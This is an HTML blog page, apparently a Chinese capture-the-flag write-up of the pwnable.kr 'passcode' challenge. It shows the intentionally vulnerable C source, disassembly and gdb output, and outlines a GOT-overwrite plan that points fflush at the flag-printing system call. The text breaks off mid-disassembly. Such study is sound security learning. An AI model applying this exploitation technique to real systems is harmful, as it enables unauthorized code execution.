@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="HANqd">
+
+
+
+<meta name="description" content="pwnable.kr-passcode这道题目有难度，之前没有遇到过，查看其他人写的writeup，有了解题思路，顺着做了一遍，加深理解。涉及知识点：scanf函数漏洞、GOT覆写技术、gdb调试参考：https://blog.csdn.net/smalosnail/article/details/53247502">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr-passcode">
+<meta property="og:url" content="https://hanqd.github.io/2019/05/23/pwnable passcode/index.html">
+<meta property="og:site_name" content="HANqd&#39;s BLOG">
+<meta property="og:description" content="pwnable.kr-passcode这道题目有难度，之前没有遇到过，查看其他人写的writeup，有了解题思路，顺着做了一遍，加深理解。涉及知识点：scanf函数漏洞、GOT覆写技术、gdb调试参考：https://blog.csdn.net/smalosnail/article/details/53247502">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-05-23T12:41:14.718Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.kr-passcode">
+<meta name="twitter:description" content="pwnable.kr-passcode这道题目有难度，之前没有遇到过，查看其他人写的writeup，有了解题思路，顺着做了一遍，加深理解。涉及知识点：scanf函数漏洞、GOT覆写技术、gdb调试参考：https://blog.csdn.net/smalosnail/article/details/53247502">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="HANqd&#39;s BLOG" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>pwnable.kr-passcode | HANqd&#39;s BLOG</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">HANqd</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">一个刚进军安全的小白。</p>
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/随笔">随笔</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:1561402970@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/802-11协议/">802.11协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSAPP笔记/">CSAPP笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IDA-Pro学习/">IDA Pro学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PAT每日一题/">PAT每日一题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn环境搭建/">pwn环境搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/恶意软件样本/">恶意软件样本</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hanqd.github.io/">HANqd</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于安全</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">HANqd</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">HANqd</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">一个刚进军安全的小白。</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/随笔">随笔</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:1561402970@qq.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
+</nav>
+      <div class="body-wrap"><article id="post-pwnable passcode" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/05/23/pwnable passcode/" class="article-date">
+      <time datetime="2019-05-23T12:40:09.829Z" itemprop="datePublished">2019-05-23</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pwnable.kr-passcode
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="pwnable-kr-passcode"><a href="#pwnable-kr-passcode" class="headerlink" title="pwnable.kr-passcode"></a>pwnable.kr-passcode</h2><p>这道题目有难度，之前没有遇到过，查看其他人写的writeup，有了解题思路，顺着做了一遍，加深理解。<br>涉及知识点：scanf函数漏洞、GOT覆写技术、gdb调试<br>参考：<a href="https://blog.csdn.net/smalosnail/article/details/53247502" target="_blank" rel="noopener">https://blog.csdn.net/smalosnail/article/details/53247502</a><br><a id="more"></a></p>
+<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mommy told me to make a passcode based login system.</span><br><span class="line">My initial C code was compiled without any error!</span><br><span class="line">Well, there was some compiler warning, but who cares about that?</span><br><span class="line"></span><br><span class="line">ssh passcode@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+<p>题目说要建立一个基于密码的登录系统，源代码C在编译时有警告。同样给出SSH远程登录的命令。</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><ol>
+<li>远程登录用户机<br>同前边的第一道题一样，有三个文件<br>flag  passcode    passcode.c</li>
+<li>查看passcode.c代码</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序很好理解，有三个函数，login、welcome、main函数，在主函数中，先调用welcome函数，在调用login函数，其中welcome函数中就调用scanf函数输入name，关键的就在login函数，输入另个数，使得passcode1==338150 &amp;&amp; passcode2==13371337就会得到flag。</p>
+<ol start="3">
+<li>这里的scanf(“%d”, passcode1)，少了‘&amp;’，取地址的符号，这里就默认从存放passcode1数据的栈中取4个字节当做scanf取的地址（本来scanf是取存放passcode1的地址，现在取的是passcode1的数据）。这里存在<strong>scanf漏洞</strong>。</li>
+</ol>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>利用GOT覆写技术，把scanf该取的passcode1地址改为其他函数的地址，如fflush函数，把<br> system(“/bin/cat flag”)这条指令写入这个函数中，那么在调用这个函数时，就能执行system函数了，从而得到flag。根据代码可以看出，这里是把输入psaacode1和passcode2绕过了，从而防止scanf错误出现。</p>
+<ol>
+<li>查看login函数的反汇编代码</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08048564</span> &lt;login&gt;:</span><br><span class="line"> <span class="number">8048564</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line"> <span class="number">8048565</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line"> <span class="number">8048567</span>:	<span class="number">83</span> ec <span class="number">28</span>             	sub    $<span class="number">0x28</span>,%esp</span><br><span class="line"> <span class="number">804856</span>a:	b8 <span class="number">70</span> <span class="number">87</span> <span class="number">04</span> <span class="number">08</span>       	mov    $<span class="number">0x8048770</span>,%eax</span><br><span class="line"> <span class="number">804856f</span>:	<span class="number">89</span> <span class="number">04</span> <span class="number">24</span>             	mov    %eax,(%esp)</span><br><span class="line"> <span class="number">8048572</span>:	e8 a9 fe ff ff       	call   <span class="number">8048420</span> &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"> <span class="number">8048577</span>:	b8 <span class="number">83</span> <span class="number">87</span> <span class="number">04</span> <span class="number">08</span>       	mov    $<span class="number">0x8048783</span>,%eax</span><br><span class="line"> <span class="number">804857</span>c:	<span class="number">8b</span> <span class="number">55</span> f0             	mov    <span class="number">-0x10</span>(%ebp),%edx</span><br><span class="line"> <span class="number">804857f</span>:	<span class="number">89</span> <span class="number">54</span> <span class="number">24</span> <span class="number">04</span>          	mov    %edx,<span class="number">0x4</span>(%esp)</span><br><span class="line"> <span class="number">8048583</span>:	<span class="number">89</span> <span class="number">04</span> <span class="number">24</span>             	mov    %eax,(%esp)</span><br><span class="line"> <span class="number">8048586</span>:	e8 <span class="number">15</span> ff ff ff       	call   <span class="number">80484</span>a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> <span class="number">804858b</span>:	a1 <span class="number">2</span>c a0 <span class="number">04</span> <span class="number">08</span>       	mov    <span class="number">0x804a02c</span>,%eax</span><br><span class="line"> <span class="number">8048590</span>:	<span class="number">89</span> <span class="number">04</span> <span class="number">24</span>             	mov    %eax,(%esp)</span><br><span class="line"> <span class="number">8048593</span>:	e8 <span class="number">98</span> fe ff ff       	call   <span class="number">8048430</span> &lt;fflush@plt&gt;</span><br><span class="line"> <span class="number">8048598</span>:	b8 <span class="number">86</span> <span class="number">87</span> <span class="number">04</span> <span class="number">08</span>       	mov    $<span class="number">0x8048786</span>,%eax</span><br><span class="line"> <span class="number">804859</span>d:	<span class="number">89</span> <span class="number">04</span> <span class="number">24</span>             	mov    %eax,(%esp)</span><br><span class="line"> <span class="number">80485</span>a0:	e8 <span class="number">7b</span> fe ff ff       	call   <span class="number">8048420</span> &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"> <span class="number">80485</span>a5:	b8 <span class="number">83</span> <span class="number">87</span> <span class="number">04</span> <span class="number">08</span>       	mov    $<span class="number">0x8048783</span>,%eax</span><br><span class="line"> <span class="number">80485</span>aa:	<span class="number">8b</span> <span class="number">55</span> f4             	mov    <span class="number">-0xc</span>(%ebp),%edx</span><br><span class="line"> <span class="number">80485</span>ad:	<span class="number">89</span> <span class="number">54</span> <span class="number">24</span> <span class="number">04</span>          	mov    %edx,<span class="number">0x4</span>(%esp)</span><br><span class="line"> <span class="number">80485b</span>1:	<span class="number">89</span> <span class="number">04</span> <span class="number">24</span>             	mov    %eax,(%esp)</span><br><span class="line"> <span class="number">80485b</span>4:	e8 e7 fe ff ff       	call   <span class="number">80484</span>a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> <span class="number">80485b</span>9:	c7 <span class="number">04</span> <span class="number">24</span> <span class="number">99</span> <span class="number">87</span> <span class="number">04</span> <span class="number">08</span> 	movl   $<span class="number">0x8048799</span>,(%esp)</span><br><span class="line"> <span class="number">80485</span>c0:	e8 <span class="number">8b</span> fe ff ff       	call   <span class="number">8048450</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"> <span class="number">80485</span>c5:	<span class="number">81</span> <span class="number">7</span>d f0 e6 <span class="number">28</span> <span class="number">05</span> <span class="number">00</span> 	cmpl   $<span class="number">0x528e6</span>,<span class="number">-0x10</span>(%ebp)</span><br><span class="line"> <span class="number">80485</span>cc:	<span class="number">75</span> <span class="number">23</span>                	jne    <span class="number">80485f</span>1 &lt;login+<span class="number">0x8d</span>&gt;</span><br><span class="line"> <span class="number">80485</span>ce:	<span class="number">81</span> <span class="number">7</span>d f4 c9 <span class="number">07</span> cc <span class="number">00</span> 	cmpl   $<span class="number">0xcc07c9</span>,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">80485</span>d5:	<span class="number">75</span> <span class="number">1</span>a                	jne    <span class="number">80485f</span>1 &lt;login+<span class="number">0x8d</span>&gt;</span><br><span class="line"> <span class="number">80485</span>d7:	c7 <span class="number">04</span> <span class="number">24</span> a5 <span class="number">87</span> <span class="number">04</span> <span class="number">08</span> 	movl   $<span class="number">0x80487a5</span>,(%esp)</span><br><span class="line"> <span class="number">80485</span>de:	e8 <span class="number">6</span>d fe ff ff       	call   <span class="number">8048450</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"> <span class="number">80485e3</span>:	c7 <span class="number">04</span> <span class="number">24</span> af <span class="number">87</span> <span class="number">04</span> <span class="number">08</span> 	movl   $<span class="number">0x80487af</span>,(%esp)</span><br><span class="line"> <span class="number">80485</span>ea:	e8 <span class="number">71</span> fe ff ff       	call   <span class="number">8048460</span> &lt;system@plt&gt;</span><br><span class="line"> <span class="number">80485</span>ef:	c9                   	leave  </span><br><span class="line"> <span class="number">80485f</span>0:	c3                   	ret    </span><br><span class="line"> <span class="number">80485f</span>1:	c7 <span class="number">04</span> <span class="number">24</span> bd <span class="number">87</span> <span class="number">04</span> <span class="number">08</span> 	movl   $<span class="number">0x80487bd</span>,(%esp)</span><br><span class="line"> <span class="number">80485f</span>8:	e8 <span class="number">53</span> fe ff ff       	call   <span class="number">8048450</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"> <span class="number">80485f</span>d:	c7 <span class="number">04</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 	movl   $<span class="number">0x0</span>,(%esp)</span><br><span class="line"> <span class="number">8048604</span>:	e8 <span class="number">77</span> fe ff ff       	call   <span class="number">8048480</span> &lt;<span class="built_in">exit</span>@plt&gt;</span><br></pre></td></tr></table></figure>
+<p> 80485e3:    c7 04 24 af 87 04 08     movl   $0x80487af,(%esp)这里是把”/bin/cat flag”入栈，那么就把0x80485e3写入fflush函数中。</p>
+<ol start="2">
+<li>查看fflush函数在GOT表中的位置：</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">passcode@ubuntu:~$ objdump -R passcode</span><br><span class="line"></span><br><span class="line">passcode:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET   TYPE              VALUE </span><br><span class="line"><span class="number">08049f</span>f0 R_386_GLOB_DAT    __gmon_start__</span><br><span class="line"><span class="number">0804</span>a02c R_386_COPY        <span class="built_in">stdin</span>@@GLIBC_2<span class="number">.0</span></span><br><span class="line"><span class="number">0804</span>a000 R_386_JUMP_SLOT   <span class="built_in">printf</span>@GLIBC_2<span class="number">.0</span></span><br><span class="line"><span class="number">0804</span>a004 R_386_JUMP_SLOT   fflush@GLIBC_2<span class="number">.0</span></span><br><span class="line"><span class="number">0804</span>a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2<span class="number">.4</span></span><br><span class="line"><span class="number">0804</span>a00c R_386_JUMP_SLOT   <span class="built_in">puts</span>@GLIBC_2<span class="number">.0</span></span><br><span class="line"><span class="number">0804</span>a010 R_386_JUMP_SLOT   system@GLIBC_2<span class="number">.0</span></span><br><span class="line"><span class="number">0804</span>a014 R_386_JUMP_SLOT   __gmon_start__</span><br><span class="line"><span class="number">0804</span>a018 R_386_JUMP_SLOT   <span class="built_in">exit</span>@GLIBC_2<span class="number">.0</span></span><br><span class="line"><span class="number">0804</span>a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2<span class="number">.0</span></span><br><span class="line"><span class="number">0804</span>a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2<span class="number">.7</span></span><br></pre></td></tr></table></figure>
+<p>需要把0x80485e3覆盖掉在0x0804a004位置的fflush函数的GOT表。<br><strong>GOT覆写技术</strong>：由于GOT表是可写的，把其中的函数地址覆盖为我们shellcode地址，在程序进行调用这个函数时就会执行shellcode。</p>
+<ol start="3">
+<li>构造填充数据<br>发现welcome（）和login（）共同使用一个共享栈，也就是说，两个函数使用同一个ebp，先调用welcome的话，name所占空间也被算在里边。</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="function"><span class="keyword">break</span> <span class="title">welcome</span><span class="params">()</span></span></span><br><span class="line">Function "welcome()" not defined.</span><br><span class="line">Make breakpoint pending on future shared library load? (y <span class="keyword">or</span> [n]) y</span><br><span class="line">Breakpoint <span class="number">2</span> (welcome()) pending.</span><br><span class="line">(gdb) i r ebp</span><br><span class="line">ebp            <span class="number">0xffadff48</span>	<span class="number">0xffadff48</span></span><br><span class="line"></span><br><span class="line">(gdb) <span class="function"><span class="keyword">break</span> <span class="title">login</span><span class="params">()</span></span></span><br><span class="line">Function "login()" not defined.</span><br><span class="line">Make breakpoint pending on future shared library load? (y <span class="keyword">or</span> [n]) y</span><br><span class="line">Breakpoint <span class="number">4</span> (login()) pending.</span><br><span class="line">(gdb) i r ebp</span><br><span class="line">ebp            <span class="number">0xffadff48</span>	<span class="number">0xffadff48</span></span><br></pre></td></tr></table></figure>
+<p>查看welcome函数的反汇编代码，找name所占空间。 -0x70(%ebp),%edx，ebp-0x70就是name的地址，0x70即为name所占空间。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08048609</span> &lt;welcome&gt;:</span><br><span class="line"> <span class="number">8048609</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line"> <span class="number">804860</span>a:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line"> <span class="number">804860</span>c:	<span class="number">81</span> ec <span class="number">88</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	sub    $<span class="number">0x88</span>,%esp</span><br><span class="line"> <span class="number">8048612</span>:	<span class="number">65</span> a1 <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    	mov    %gs:<span class="number">0x14</span>,%eax</span><br><span class="line"> <span class="number">8048618</span>:	<span class="number">89</span> <span class="number">45</span> f4             	mov    %eax,<span class="number">-0xc</span>(%ebp)</span><br><span class="line"> <span class="number">804861b</span>:	<span class="number">31</span> c0                	xor    %eax,%eax</span><br><span class="line"> <span class="number">804861</span>d:	b8 cb <span class="number">87</span> <span class="number">04</span> <span class="number">08</span>       	mov    $<span class="number">0x80487cb</span>,%eax</span><br><span class="line"> <span class="number">8048622</span>:	<span class="number">89</span> <span class="number">04</span> <span class="number">24</span>             	mov    %eax,(%esp)</span><br><span class="line"> <span class="number">8048625</span>:	e8 f6 fd ff ff       	call   <span class="number">8048420</span> &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"> <span class="number">804862</span>a:	b8 dd <span class="number">87</span> <span class="number">04</span> <span class="number">08</span>       	mov    $<span class="number">0x80487dd</span>,%eax</span><br><span class="line"> <span class="number">804862f</span>:	<span class="number">8</span>d <span class="number">55</span> <span class="number">90</span>             	lea    <span 